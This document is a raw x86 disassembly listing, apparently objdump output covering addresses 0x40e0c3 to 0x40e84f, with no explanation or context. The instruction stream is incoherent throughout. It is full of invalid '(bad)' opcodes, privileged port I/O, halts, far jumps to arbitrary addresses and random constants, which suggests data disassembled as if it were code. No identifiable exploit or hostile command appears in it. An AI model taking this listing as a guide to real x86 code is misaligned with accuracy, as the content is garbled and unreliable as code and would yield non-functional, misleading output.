  40e0c3:	cmp    eax,0x9e870a9a
  40e0c8:	ret    0x1cb2
  40e0cb:	xlat   BYTE PTR ds:[ebx]
  40e0cc:	pop    ebx
  40e0cd:	mov    ds:0x56aba498,eax
  40e0d2:	jp     0x40e115
  40e0d4:	mov    cl,0xae
  40e0d6:	cwde   
  40e0d7:	(bad)  [eax+0x186fc5c7]
  40e0dd:	cmp    ah,BYTE PTR [edi]
  40e0df:	lods   eax,DWORD PTR ds:[esi]
  40e0e0:	fmul   DWORD PTR [ecx-0x53374ebb]
  40e0e6:	jb     0x40e163
  40e0e8:	jb     0x40e162
  40e0ea:	add    DWORD PTR [edi-0x52],0xe5e23424
  40e0f1:	dec    dh
  40e0f3:	pop    esi
  40e0f4:	mov    edx,DWORD PTR [edi]
  40e0f6:	mov    esp,0xc4f76e47
  40e0fb:	pop    edi
  40e0fc:	je     0x40e168
  40e0fe:	add    DWORD PTR [esi+ebp*1+0x44ccf35d],edx
  40e105:	sahf   
  40e106:	sar    DWORD PTR [eax],0x11
  40e109:	cmp    BYTE PTR [esi-0x106412b3],bh
  40e10f:	jmp    0x40e17f
  40e111:	mov    esp,0x6b6cee2d
  40e116:	in     al,0x64
  40e118:	inc    ecx
  40e119:	loope  0x40e147
  40e11b:	dec    ebx
  40e11c:	lods   eax,DWORD PTR ds:[esi]
  40e11d:	sbb    esp,DWORD PTR [edi+0x4b10e4f9]
  40e123:	aaa    
  40e124:	out    dx,al
  40e125:	cmp    eax,0xd0fe0e15
  40e12a:	sbb    eax,0xdd462527
  40e12f:	ffreep st(2)
  40e131:	fs pop ss
  40e133:	fsub   QWORD PTR [eax+0x43a05b56]
  40e139:	nop
  40e13a:	hlt    
  40e13b:	mov    ch,0x35
  40e13d:	adc    dl,bl
  40e13f:	lods   eax,DWORD PTR ds:[esi]
  40e140:	add    eax,0x5dedd9ae
  40e145:	popf   
  40e146:	fnstcw WORD PTR [esi+0x2df9359c]
  40e14c:	push   esi
  40e14d:	ret    
  40e14e:	jne    0x40e1be
  40e150:	repz push ecx
  40e152:	stos   DWORD PTR es:[edi],eax
  40e153:	imul   edi,DWORD PTR [eax-0xb],0xd06cbf98
  40e15a:	cmp    al,0xd
  40e15c:	dec    edx
  40e15d:	pop    edi
  40e15e:	loope  0x40e154
  40e160:	pop    ss
  40e161:	inc    esp
  40e162:	lahf   
  40e163:	cmp    dl,BYTE PTR [eax]
  40e165:	xor    al,0x5f
  40e167:	add    al,0xa0
  40e169:	sahf   
  40e16a:	mov    ds:0xe4024395,eax
  40e16f:	dec    esp
  40e170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e171:	lods   al,BYTE PTR ds:[esi]
  40e172:	push   ebp
  40e173:	jg     0x40e10d
  40e175:	rcl    DWORD PTR [ebx+0x30296799],1
  40e17b:	dec    eax
  40e17c:	aad    0x9d
  40e17e:	xchg   DWORD PTR [esi-0x271c1015],eax
  40e184:	outs   dx,BYTE PTR ds:[esi]
  40e185:	push   edi
  40e186:	(bad)
  40e189:	call   0xbacd0fd5
  40e18e:	sub    ebp,eax
  40e190:	push   ebx
  40e191:	jmp    0x40e12d
  40e193:	in     al,0xc2
  40e195:	mov    dl,0xf2
  40e197:	mov    bl,0xd4
  40e199:	psubd  mm5,QWORD PTR [ebx]
  40e19c:	lahf   
  40e19d:	push   esp
  40e19e:	push   0xedb8144
  40e1a3:	push   esp
  40e1a4:	sub    esp,DWORD PTR [ecx+ebp*1+0x23]
  40e1a8:	imul   esp,esp,0xa89415e3
  40e1ae:	adc    BYTE PTR ds:0xd2aeb633,ch
  40e1b4:	ja     0x40e207
  40e1b6:	mov    edi,0x6a947695
  40e1bb:	pop    edi
  40e1bc:	in     eax,0x41
  40e1be:	cli    
  40e1bf:	dec    eax
  40e1c0:	into   
  40e1c1:	aaa    
  40e1c2:	cmc    
  40e1c3:	jl     0x40e165
  40e1c5:	mov    esi,0xf1f67c41
  40e1ca:	or     ecx,DWORD PTR [edx+edi*8-0x71e32d61]
  40e1d1:	enter  0x8a58,0x4
  40e1d5:	adc    edi,0x5a
  40e1d8:	mov    cl,0xf8
  40e1da:	leave  
  40e1db:	pop    edi
  40e1dc:	or     eax,0x8f68d01b
  40e1e1:	xchg   edx,eax
  40e1e2:	fdivr  st,st(6)
  40e1e4:	push   esi
  40e1e5:	cmp    ebp,DWORD PTR [esp+eax*4+0x71693168]
  40e1ec:	adc    bl,BYTE PTR [ecx-0x3a]
  40e1ef:	jl     0x40e1d5
  40e1f1:	inc    ecx
  40e1f2:	mov    edx,DWORD PTR [edx]
  40e1f4:	mov    bh,0x81
  40e1f6:	dec    DWORD PTR [esp+eax*2-0x3934de09]
  40e1fd:	mov    bh,0xb0
  40e1ff:	mov    bl,bl
  40e201:	ret    
  40e202:	cmp    eax,0xecd0cf19
  40e207:	mov    esi,0x5c1cc983
  40e20c:	pop    es
  40e20d:	arpl   bx,bp
  40e20f:	nop
  40e210:	mov    ch,0x22
  40e212:	mov    cs,esi
  40e214:	jg     0x40e1bc
  40e216:	pusha  
  40e217:	fadd   st,st(7)
  40e219:	push   ds
  40e21a:	cmp    eax,0xaa29ee2c
  40e21f:	aam    0x3f
  40e221:	arpl   WORD PTR [ebx+edi*4+0x68],si
  40e225:	imul   ebx,DWORD PTR [ebx-0x28],0x8
  40e229:	repz iret 
  40e22b:	xchg   esi,eax
  40e22c:	add    eax,0x7141f465
  40e231:	jg     0x40e2a1
  40e233:	add    eax,0xf7ed0102
  40e238:	ja     0x40e2ab
  40e23a:	jl     0x40e1de
  40e23c:	mov    bl,0x5c
  40e23e:	addr16 jb 0x40e2a1
  40e241:	inc    ecx
  40e242:	imul   edi,DWORD PTR [ecx+0x72],0x70
  40e246:	xor    esi,esp
  40e248:	lock arpl WORD PTR [eax],cx
  40e24b:	stos   BYTE PTR es:[edi],al
  40e24c:	call   0xe31f:0xae4bf489
  40e253:	push   edi
  40e254:	push   ds
  40e255:	cld    
  40e256:	mov    BYTE PTR [eax],bh
  40e258:	and    bl,cl
  40e25a:	dec    ebx
  40e25b:	arpl   bx,si
  40e25d:	dec    ecx
  40e25e:	push   edi
  40e25f:	pop    ds
  40e260:	jo     0x40e23f
  40e262:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e263:	in     eax,0xed
  40e265:	add    BYTE PTR [ebx+0x64],al
  40e268:	ret    
  40e269:	aam    0xc2
  40e26b:	jecxz  0x40e287
  40e26d:	cmp    ch,dh
  40e26f:	mov    ebp,0x414e556
  40e274:	and    DWORD PTR [edx-0xd],0xffffffdc
  40e278:	push   edi
  40e279:	cwde   
  40e27a:	rol    esp,0x94
  40e27d:	pop    ss
  40e27e:	mov    esi,0x1a8c17fd
  40e283:	and    eax,0xcccce8e9
  40e288:	out    0xc9,eax
  40e28a:	sub    al,0x2d
  40e28c:	xchg   ebx,eax
  40e28d:	pop    gs
  40e28f:	xor    eax,DWORD PTR [edi-0x3f]
  40e292:	icebp  
  40e293:	lea    ecx,[edx-0x4f]
  40e296:	lea    eax,[eax]
  40e298:	jmp    0xa83d163a
  40e29d:	jno    0x40e2db
  40e29f:	les    edi,FWORD PTR [ebx-0x20]
  40e2a2:	jg     0x40e323
  40e2a4:	jmp    0x94228031
  40e2a9:	jns    0x40e300
  40e2ab:	xchg   edi,eax
  40e2ac:	test   BYTE PTR [eax+esi*1-0x5afc6db],dh
  40e2b3:	push   ss
  40e2b4:	push   edx
  40e2b5:	(bad)  
  40e2b6:	xlat   BYTE PTR ds:[ebx]
  40e2b7:	jne    0x40e328
  40e2b9:	or     al,0x26
  40e2bb:	inc    ecx
  40e2bc:	call   0x79baea64
  40e2c1:	xor    eax,0x93c961a5
  40e2c6:	add    al,0xe7
  40e2c8:	stc    
  40e2c9:	mov    edi,edx
  40e2cb:	mov    dl,BYTE PTR [edi-0x479c784]
  40e2d1:	(bad)  [ebx+0xc066365]
  40e2d7:	idiv   esi
  40e2d9:	or     eax,0x48ec8da7
  40e2de:	popf   
  40e2df:	mov    esi,0x5787494
  40e2e4:	scas   eax,DWORD PTR es:[edi]
  40e2e5:	push   edx
  40e2e6:	ret    
  40e2e7:	icebp  
  40e2e8:	call   0x17295445
  40e2ed:	out    dx,al
  40e2ee:	pop    ebx
  40e2ef:	pop    ebp
  40e2f0:	mov    ds:0x25277988,eax
  40e2f5:	cld    
  40e2f6:	mov    dh,0xff
  40e2f8:	or     DWORD PTR [edi],ebp
  40e2fa:	lahf   
  40e2fb:	inc    edx
  40e2fc:	rcr    DWORD PTR [ecx+0x67beb135],0x74
  40e303:	cli    
  40e304:	jecxz  0x40e2ef
  40e306:	(bad)  
  40e307:	fadd   QWORD PTR [ecx-0x3c]
  40e30a:	cdq    
  40e30b:	aas    
  40e30c:	dec    ebx
  40e30d:	push   esp
  40e30e:	push   esi
  40e30f:	xor    DWORD PTR [eax-0x6e109a16],esi
  40e315:	pusha  
  40e316:	inc    eax
  40e317:	xor    bl,bl
  40e319:	xchg   edi,eax
  40e31a:	mov    ebx,0xa34fd065
  40e31f:	push   es
  40e320:	jmp    0x5ee3:0x7755c22
  40e327:	cwde   
  40e328:	test   eax,0x16b31e2d
  40e32d:	lods   eax,DWORD PTR ds:[esi]
  40e32e:	xchg   BYTE PTR [esi-0x2cb1b86d],ch
  40e334:	rol    BYTE PTR [eax+0x24],0x89
  40e338:	jae    0x40e3ab
  40e33a:	mul    DWORD PTR [ebp-0x18397287]
  40e340:	nop
  40e341:	call   0x863041c3
  40e346:	mov    esp,0x65925139
  40e34b:	push   esp
  40e34c:	dec    esi
  40e34d:	jo     0x40e3ac
  40e34f:	and    DWORD PTR [ebx-0x76],esi
  40e352:	xchg   esp,eax
  40e353:	jb     0x40e31c
  40e355:	xchg   ecx,eax
  40e356:	adc    esp,DWORD PTR [eax]
  40e358:	or     dh,BYTE PTR ds:0x22ccc322
  40e35e:	mov    cl,0xbd
  40e360:	and    edi,esi
  40e362:	add    al,ah
  40e364:	enter  0xedf2,0x46
  40e368:	lahf   
  40e369:	inc    eax
  40e36a:	sti    
  40e36b:	xor    al,0x31
  40e36d:	mov    ah,0x74
  40e36f:	lahf   
  40e370:	xor    al,0x52
  40e372:	div    al
  40e374:	jo     0x40e397
  40e376:	or     al,0x70
  40e378:	jg     0x40e312
  40e37a:	sar    ah,1
  40e37c:	mov    ecx,0xf6af1301
  40e381:	xchg   ecx,eax
  40e382:	push   ss
  40e383:	pop    ecx
  40e384:	test   esp,edi
  40e386:	add    ebx,ecx
  40e388:	add    al,0x3d
  40e38a:	push   ss
  40e38b:	xor    ebp,DWORD PTR [ebx]
  40e38d:	push   edi
  40e38e:	adc    DWORD PTR [ebp+0x198e9adb],esi
  40e394:	retf   
  40e395:	pop    eax
  40e396:	inc    ebx
  40e397:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e398:	xchg   esi,eax
  40e399:	outs   dx,BYTE PTR ds:[esi]
  40e39a:	add    al,0x7e
  40e39c:	jl     0x40e325
  40e39e:	pusha  
  40e39f:	in     eax,0x3
  40e3a1:	ret    0x5a04
  40e3a4:	xchg   edx,eax
  40e3a5:	cmp    ch,BYTE PTR [esi+eiz*1-0x63]
  40e3a9:	inc    esi
  40e3aa:	mov    edx,0xbfece0f1
  40e3af:	in     al,dx
  40e3b0:	mov    ebx,0xb8aa8369
  40e3b5:	dec    ebp
  40e3b6:	pop    ss
  40e3b7:	and    al,0xd5
  40e3b9:	(bad)  
  40e3ba:	mov    dh,0x1b
  40e3bc:	out    0xb,eax
  40e3be:	mov    edi,0xd2d121d8
  40e3c3:	retf   
  40e3c4:	xchg   edx,eax
  40e3c5:	fistp  DWORD PTR [ecx-0x2]
  40e3c8:	lea    eax,[ebp-0x98]
  40e3ce:	jmp    0x40e8d9
  40e3d3:	into   
  40e3d4:	leave  
  40e3d5:	ds cmp eax,0xd9cdc9d9
  40e3db:	xor    al,0xff
  40e3dd:	xchg   ebp,eax
  40e3de:	xor    esp,DWORD PTR [ecx+0x54]
  40e3e1:	dec    ecx
  40e3e2:	sbb    al,BYTE PTR cs:[esi+0x78]
  40e3e6:	js     0x40e452
  40e3e8:	jl     0x40e462
  40e3ea:	js     0x40e45e
  40e3ec:	jge    0x40e3fb
  40e3ee:	pop    eax
  40e3ef:	push   es
  40e3f0:	mov    cl,0x5b
  40e3f2:	es mov dh,0x4c
  40e3f5:	lods   al,BYTE PTR ds:[esi]
  40e3f6:	scas   al,BYTE PTR es:[edi]
  40e3f7:	pop    ds
  40e3f8:	retf   0x19f6
  40e3fb:	mov    esp,esp
  40e3fd:	inc    edi
  40e3fe:	xchg   bl,bl
  40e400:	xchg   esp,eax
  40e401:	and    dl,BYTE PTR [esi+0x753c8342]
  40e407:	sbb    eax,0x533d1b7
  40e40c:	in     al,0x66
  40e40e:	adc    al,bl
  40e410:	inc    edx
  40e411:	daa    
  40e412:	retf   
  40e413:	push   edi
  40e414:	in     eax,0xb7
  40e416:	clc    
  40e417:	mov    ds,WORD PTR [ecx+0x77c62b71]
  40e41d:	adc    dh,BYTE PTR [ecx-0x40]
  40e420:	add    edi,DWORD PTR [ecx]
  40e422:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e423:	jp     0x40e4a0
  40e425:	lahf   
  40e426:	fs dec eax
  40e428:	(bad)
  40e42d:	push   cs
  40e42e:	icebp  
  40e42f:	imul   ebx,DWORD PTR [edx],0x7d
  40e432:	ins    BYTE PTR es:[edi],dx
  40e433:	dec    eax
  40e434:	adc    al,0x30
  40e436:	in     al,0x9a
  40e438:	rol    BYTE PTR [ecx-0x610d53f8],0xe3
  40e43f:	xchg   esi,eax
  40e440:	inc    edx
  40e441:	adc    DWORD PTR [ecx+ebp*8],esi
  40e444:	mov    dl,0xce
  40e446:	jne    0x40e49a
  40e448:	out    0x64,eax
  40e44a:	add    BYTE PTR [ebx],ch
  40e44c:	test   al,0x69
  40e44e:	es retf 0x1a56
  40e452:	mov    cl,0x99
  40e454:	popf   
  40e455:	cwde   
  40e456:	dec    ebp
  40e457:	dec    ecx
  40e458:	sub    bl,BYTE PTR [ecx+eax*2-0x4e181614]
  40e45f:	lods   eax,DWORD PTR ds:[esi]
  40e460:	push   ebp
  40e461:	sub    DWORD PTR [edx],ebx
  40e463:	sbb    ebp,DWORD PTR [ecx-0x7bf28f06]
  40e469:	and    DWORD PTR [eax+eiz*4-0x31],ebp
  40e46d:	mov    edx,0x6859449b
  40e472:	ror    DWORD PTR [ebp-0x50],1
  40e475:	sbb    ecx,DWORD PTR [ecx]
  40e477:	mov    al,0xa8
  40e479:	ins    BYTE PTR es:[edi],dx
  40e47a:	loopne 0x40e41d
  40e47c:	mov    esi,0x191c8489
  40e481:	(bad)  
  40e482:	sub    cl,0x57
  40e485:	mov    esp,0x18cc41cf
  40e48a:	iret   
  40e48b:	cld    
  40e48c:	fst    st(6)
  40e48e:	adc    DWORD PTR [ebx+0x6ba3e4b0],ecx
  40e494:	pop    ebx
  40e495:	sub    al,0x41
  40e497:	jbe    0x40e510
  40e499:	mov    ecx,0x45bfd77
  40e49e:	(bad)  
  40e49f:	(bad)  
  40e4a1:	ret    
  40e4a2:	in     eax,dx
  40e4a3:	mov    edx,0xc5a07cf5
  40e4a8:	mov    bl,0x2e
  40e4aa:	adc    DWORD PTR [ebx-0x57d8b189],0x82870b33
  40e4b4:	shr    edx,0x93
  40e4b7:	dec    edx
  40e4b8:	test   eax,0xf45d2b50
  40e4bd:	leave  
  40e4be:	out    0xbf,al
  40e4c0:	hlt    
  40e4c1:	dec    ebx
  40e4c2:	leave  
  40e4c3:	mov    edx,ecx
  40e4c5:	ss dec esp
  40e4c7:	in     eax,0xa3
  40e4c9:	jnp    0x40e4d5
  40e4cb:	or     BYTE PTR [esi+0x7c],bl
  40e4ce:	stos   BYTE PTR es:[edi],al
  40e4cf:	pop    ss
  40e4d0:	sub    DWORD PTR [ecx-0x27],esi
  40e4d3:	dec    edi
  40e4d4:	dec    esi
  40e4d5:	pusha  
  40e4d6:	ror    edx,cl
  40e4d8:	out    0xf6,eax
  40e4da:	push   edx
  40e4db:	jp     0x40e4ac
  40e4dd:	add    eax,0x9d5add8
  40e4e2:	arpl   WORD PTR [edi],bx
  40e4e4:	inc    eax
  40e4e5:	(bad)  [ebp+edx*4+0x2f7aa3d]
  40e4ec:	int3   
  40e4ed:	cli    
  40e4ee:	xchg   esi,eax
  40e4ef:	pop    edi
  40e4f0:	dec    ebp
  40e4f1:	add    ch,ch
  40e4f3:	loop   0x40e4ef
  40e4f5:	pop    esp
  40e4f6:	test   DWORD PTR [edx+edx*2],0xb1482f46
  40e4fd:	nop
  40e4fe:	outs   dx,DWORD PTR ds:[esi]
  40e4ff:	push   esi
  40e500:	fnstenv [ebp-0x4e035c69]
  40e506:	jmp    0x40e4f3
  40e508:	fisubr WORD PTR fs:[esi]
  40e50b:	add    dl,ah
  40e50d:	cmp    bl,BYTE PTR [ebx+0x7b998f15]
  40e513:	mov    esi,0x3fb2df8c
  40e518:	and    BYTE PTR [ebx-0x3e],dh
  40e51b:	ret    
  40e51c:	retf   0xdcc7
  40e51f:	ficom  WORD PTR [edi]
  40e521:	xchg   edx,eax
  40e522:	test   BYTE PTR [ebx+ebp*1-0x5ce888ed],0x2a
  40e52a:	sub    DWORD PTR [edi+eax*8-0x6f701354],edx
  40e531:	sbb    BYTE PTR ds:0x66b66dcc,dh
  40e537:	mov    edi,0x34ffe495
  40e53c:	repnz loopne 0x40e518
  40e53f:	inc    esp
  40e540:	mov    fs,WORD PTR [edi+0x33]
  40e543:	mov    ah,ah
  40e545:	cs loopne 0x40e552
  40e548:	js     0x40e5a6
  40e54a:	test   BYTE PTR [ebx],cl
  40e54c:	pop    ds
  40e54d:	dec    eax
  40e54e:	scas   al,BYTE PTR es:[edi]
  40e54f:	pop    esi
  40e550:	test   dh,ch
  40e552:	adc    DWORD PTR ds:0x94c8f72d,ebp
  40e558:	xchg   ebx,eax
  40e559:	cs xor al,0xa8
  40e55c:	(bad)  
  40e55e:	pop    ds
  40e55f:	cmp    al,0xd6
  40e561:	mov    ds,WORD PTR [esi+0x45be74ab]
  40e567:	dec    eax
  40e568:	and    al,0x21
  40e56a:	(bad)  
  40e56b:	aas    
  40e56c:	lds    edi,FWORD PTR [ecx+ebp*8+0x7d]
  40e570:	(bad)  
  40e572:	mov    ch,BYTE PTR [edx-0x24445350]
  40e578:	ror    edi,1
  40e57a:	dec    edx
  40e57b:	sbb    al,0x90
  40e57d:	jbe    0x40e51f
  40e57f:	or     bl,al
  40e581:	int    0xf6
  40e583:	mov    bh,0x2a
  40e585:	or     al,BYTE PTR ds:0xc25bd601
  40e58b:	and    ch,BYTE PTR [eax-0x1cfe36d9]
  40e591:	shr    edx,0xe6
  40e594:	sbb    esi,edx
  40e596:	xchg   esi,eax
  40e597:	scas   al,BYTE PTR es:[edi]
  40e598:	icebp  
  40e599:	mov    edi,0xe09a7a6f
  40e59e:	pop    edi
  40e59f:	cld    
  40e5a0:	bound  eax,QWORD PTR ds:0xb67aa66
  40e5a6:	pop    ds
  40e5a7:	cdq    
  40e5a8:	cmp    al,0xb9
  40e5aa:	dec    edi
  40e5ab:	in     al,0x71
  40e5ad:	push   cs
  40e5ae:	jp     0x40e581
  40e5b0:	mov    bl,0x6b
  40e5b2:	leave  
  40e5b3:	mov    ds:0x1bd60792,eax
  40e5b8:	aas    
  40e5b9:	sub    DWORD PTR [edi],0x76
  40e5bc:	mov    esi,0x4c3c9312
  40e5c1:	cli    
  40e5c2:	stc    
  40e5c3:	lock mov dl,0x8c
  40e5c6:	sahf   
  40e5c7:	fwait
  40e5c8:	enter  0xd67e,0x97
  40e5cc:	mul    edi
  40e5ce:	mov    ebx,0xc5d07824
  40e5d3:	xchg   esi,eax
  40e5d4:	sub    ecx,DWORD PTR ds:0xd24081c7
  40e5da:	shr    DWORD PTR [edi+edx*8],0xb4
  40e5de:	ja     0x40e61d
  40e5e0:	mov    ah,BYTE PTR [ecx]
  40e5e2:	sub    cl,BYTE PTR [eax-0x8]
  40e5e5:	inc    esi
  40e5e6:	jle    0x40e614
  40e5e8:	retf   0x58b7
  40e5eb:	adc    al,0xc8
  40e5ed:	aam    0xf
  40e5ef:	mov    edi,0xc43c9a21
  40e5f4:	sub    ch,BYTE PTR [esi]
  40e5f6:	popa   
  40e5f7:	arpl   WORD PTR [edx],ax
  40e5f9:	pusha  
  40e5fa:	mov    BYTE PTR [edi],ah
  40e5fc:	mov    ah,0xa5
  40e5fe:	ss and al,0x4
  40e601:	and    BYTE PTR [edx+esi*8+0x1386513c],cl
  40e608:	cmc    
  40e609:	loop   0x40e676
  40e60b:	push   cs
  40e60c:	sbb    eax,DWORD PTR [edx+0x5c50b3ad]
  40e612:	mov    eax,0x4d680f6c
  40e617:	inc    esp
  40e618:	in     eax,dx
  40e619:	jmp    0x40e5a9
  40e61b:	xor    DWORD PTR [esi],esp
  40e61d:	jl     0x40e65b
  40e61f:	xchg   cl,dh
  40e621:	xor    eax,0x739c9d90
  40e626:	aas    
  40e627:	(bad)  
  40e628:	pop    eax
  40e629:	ret    0x96e3
  40e62c:	js     0x40e62a
  40e62e:	lods   al,BYTE PTR ds:[esi]
  40e62f:	inc    edi
  40e630:	mul    DWORD PTR [edi+0x71d878f3]
  40e636:	adc    al,0x2
  40e638:	inc    ecx
  40e639:	loope  0x40e698
  40e63b:	test   edx,edi
  40e63d:	push   esi
  40e63e:	mov    eax,ds:0xc12adcb7
  40e643:	stc    
  40e644:	(bad)  
  40e646:	pop    es
  40e647:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e648:	and    edi,DWORD PTR [edi+ebx*2-0x68]
  40e64c:	jmp    0xef8:0xfca61020
  40e653:	jge    0x40e677
  40e655:	nop
  40e656:	lock and DWORD PTR [eax+0x72],ebp
  40e65a:	lfs    edx,FWORD PTR [eax-0x6111f193]
  40e661:	pop    esi
  40e662:	mov    bh,0x81
  40e664:	hlt    
  40e665:	mov    esi,0xd952743
  40e66a:	cld    
  40e66b:	jnp    0x40e60a
  40e66d:	jo     0x40e61a
  40e66f:	xchg   ecx,eax
  40e670:	lods   eax,DWORD PTR ds:[esi]
  40e671:	dec    esp
  40e672:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e674:	xchg   ecx,eax
  40e675:	xor    BYTE PTR [ebp+0x6c],dh
  40e678:	int3   
  40e679:	cmc    
  40e67a:	add    BYTE PTR [ecx+0x57],ch
  40e67d:	and    BYTE PTR [esi-0x74993f7b],0x53
  40e684:	add    DWORD PTR [ebp-0x2f],ebx
  40e687:	jge    0x40e618
  40e689:	lods   al,BYTE PTR ds:[esi]
  40e68a:	js     0x40e677
  40e68c:	repnz int3 
  40e68e:	cmp    eax,0x4b4c6b
  40e693:	into   
  40e694:	(bad)  
  40e697:	jl     0x40e621
  40e699:	inc    edi
  40e69a:	arpl   WORD PTR [ecx-0x7c],dx
  40e69d:	iret   
  40e69e:	mov    eax,ds:0x224d08cd
  40e6a3:	data16 jmp 0x40e62e
  40e6a6:	dec    edi
  40e6a7:	jg     0x40e67f
  40e6a9:	mov    WORD PTR [esi-0x4a5f19bd],gs
  40e6af:	popf   
  40e6b0:	xor    eax,0x74cbdfc2
  40e6b5:	pop    es
  40e6b6:	inc    eax
  40e6b7:	push   0xffffffeb
  40e6b9:	mov    WORD PTR [esi+eax*1],?
  40e6bc:	push   eax
  40e6bd:	inc    esi
  40e6be:	jae    0x40e6b8
  40e6c0:	dec    edx
  40e6c1:	int3   
  40e6c2:	push   ss
  40e6c3:	(bad)  
  40e6c4:	jno    0x40e6c6
  40e6c6:	pop    ss
  40e6c7:	dec    edx
  40e6c8:	mov    al,0x7e
  40e6ca:	sub    dh,al
  40e6cc:	mov    al,0x5f
  40e6ce:	add    BYTE PTR [edx+ebx*2],dh
  40e6d1:	push   0xa7687b
  40e6d6:	call   0x799892fe
  40e6db:	daa    
  40e6dc:	inc    ecx
  40e6dd:	outs   dx,BYTE PTR ds:[esi]
  40e6de:	sbb    al,0xbf
  40e6e0:	fwait
  40e6e1:	pop    ecx
  40e6e2:	out    0xf4,al
  40e6e4:	stos   BYTE PTR es:[edi],al
  40e6e5:	sub    dl,ch
  40e6e7:	and    DWORD PTR [eax+0x3a18cfb1],0xcf77a1b2
  40e6f1:	stos   BYTE PTR es:[edi],al
  40e6f2:	enter  0x5530,0x11
  40e6f6:	in     al,0x62
  40e6f8:	xchg   ecx,eax
  40e6f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6fa:	out    dx,eax
  40e6fb:	add    cl,BYTE PTR [ebx]
  40e6fd:	add    al,0x24
  40e6ff:	ss jno 0x40e6ea
  40e702:	lahf   
  40e703:	retf   
  40e704:	mov    cl,0xb
  40e706:	fucomp st(0)
  40e708:	xchg   dh,dh
  40e70a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e70b:	jo     0x40e70d
  40e70d:	inc    eax
  40e70e:	jl     0x40e763
  40e710:	scas   al,BYTE PTR es:[edi]
  40e711:	sahf   
  40e712:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e713:	daa    
  40e714:	call   0xdaa4:0xd31dc854
  40e71b:	nop
  40e71c:	dec    esp
  40e71d:	jae    0x40e74c
  40e71f:	cmc    
  40e720:	test   eax,0x22f285cb
  40e725:	mov    dl,0xf8
  40e727:	repnz sbb bl,BYTE PTR [ecx-0x7813918a]
  40e72e:	cmp    eax,0x39abb491
  40e733:	pop    edx
  40e734:	shl    dh,1
  40e736:	les    ecx,FWORD PTR [ebx+0x4c]
  40e739:	mov    ecx,0x6227ee1b
  40e73e:	je     0x40e7a5
  40e740:	jno    0x40e7af
  40e742:	dec    esi
  40e743:	or     DWORD PTR [edi+edi*8-0x4d],0x2d
  40e748:	out    dx,eax
  40e749:	sub    edi,edx
  40e74b:	xchg   esi,eax
  40e74c:	cmp    ebp,DWORD PTR [ebx+0x9]
  40e74f:	data16 add al,0xc1
  40e753:	jmp    0x40e76d
  40e755:	adc    BYTE PTR [edx+0x55],ch
  40e758:	mov    BYTE PTR [edi-0x10],ah
  40e75b:	mov    bl,0xe9
  40e75d:	cmp    al,0xaa
  40e75f:	idiv   BYTE PTR [edx-0x14aa6ace]
  40e765:	pusha  
  40e766:	jno    0x40e71d
  40e768:	into   
  40e769:	add    bl,BYTE PTR [eax]
  40e76b:	cld    
  40e76c:	in     al,0x4e
  40e76e:	jge    0x40e71e
  40e770:	sbb    eax,0x9c560799
  40e775:	add    al,cl
  40e777:	or     al,0x84
  40e779:	ins    DWORD PTR es:[edi],dx
  40e77a:	test   DWORD PTR [esp+eax*1],0x77338f8f
  40e781:	bound  edx,QWORD PTR [edi+0x4fa41365]
  40e787:	adc    eax,0xb86031c3
  40e78c:	push   ds
  40e78d:	popf   
  40e78e:	rcr    BYTE PTR [esi+0x52],1
  40e791:	adc    ah,bl
  40e793:	pop    eax
  40e794:	std    
  40e795:	mov    ebx,0xc85cd95f
  40e79a:	stc    
  40e79b:	xchg   edx,eax
  40e79c:	shl    DWORD PTR [eax+edx*4-0x79],cl
  40e7a0:	jmp    DWORD PTR [esi]
  40e7a2:	push   edx
  40e7a3:	sub    DWORD PTR [ebp+eax*4+0x12],0xf
  40e7a8:	sub    DWORD PTR gs:[eax+0x28234302],0xc6178d7d
  40e7b3:	and    eax,0x25a00fe5
  40e7b8:	add    eax,0xa0f42b35
  40e7bd:	mov    bl,0x43
  40e7bf:	jbe    0x40e7ec
  40e7c1:	adc    DWORD PTR ds:0x60186c80,edx
  40e7c7:	mov    dh,0x99
  40e7c9:	retf   
  40e7ca:	mov    eax,0x26512236
  40e7cf:	hlt    
  40e7d0:	and    BYTE PTR [edx],cl
  40e7d2:	add    eax,0x11f831f7
  40e7d7:	(bad)  
  40e7d8:	shr    edi,1
  40e7da:	iret   
  40e7db:	push   eax
  40e7dc:	ins    BYTE PTR es:[edi],dx
  40e7dd:	jecxz  0x40e80d
  40e7df:	sbb    cl,BYTE PTR [edi]
  40e7e1:	and    al,0x14
  40e7e3:	data16 jne 0x40e77a
  40e7e6:	cmp    edi,ebx
  40e7e8:	ins    BYTE PTR es:[edi],dx
  40e7e9:	cld    
  40e7ea:	pusha  
  40e7eb:	mov    WORD PTR ds:0xaa5e0237,?
  40e7f1:	add    eax,esp
  40e7f3:	or     BYTE PTR [edi-0x67],0x61
  40e7f7:	in     eax,dx
  40e7f8:	adc    eax,0x4d3c4a14
  40e7fd:	adc    al,0xb3
  40e7ff:	test   eax,0xd14af092
  40e804:	sub    ebp,DWORD PTR [edx-0x280b9af1]
  40e80a:	test   eax,0x5f910009
  40e80f:	clc    
  40e810:	fnstsw WORD PTR [esi+0x66c61da6]
  40e816:	sub    al,0xe6
  40e818:	cs sub cl,ch
  40e81b:	sbb    DWORD PTR [ebx],ebx
  40e81d:	outs   dx,DWORD PTR ds:[esi]
  40e81e:	pop    edx
  40e81f:	hlt    
  40e820:	les    ecx,FWORD PTR [ebx-0x17]
  40e823:	adc    ebp,DWORD PTR [ebx+0x7d]
  40e826:	pop    ebp
  40e827:	cs leave 
  40e829:	add    BYTE PTR [eax+0x7c],cl
  40e82c:	or     dh,BYTE PTR [ecx-0x237e4ab2]
  40e832:	mov    edx,0xcd6137bd
  40e837:	popa   
  40e838:	lock push edx
  40e83a:	push   ecx
  40e83b:	data16 xor al,0xb3
  40e83e:	mov    ds:0xefff4f0a,eax
  40e843:	mov    al,ds:0xf45cb1fa
  40e848:	iret   
  40e849:	stc    
  40e84a:	(bad)  
  40e84c:	adc    DWORD PTR [esi+0x54],ecx
  40e84f:	sub    al,0x6d
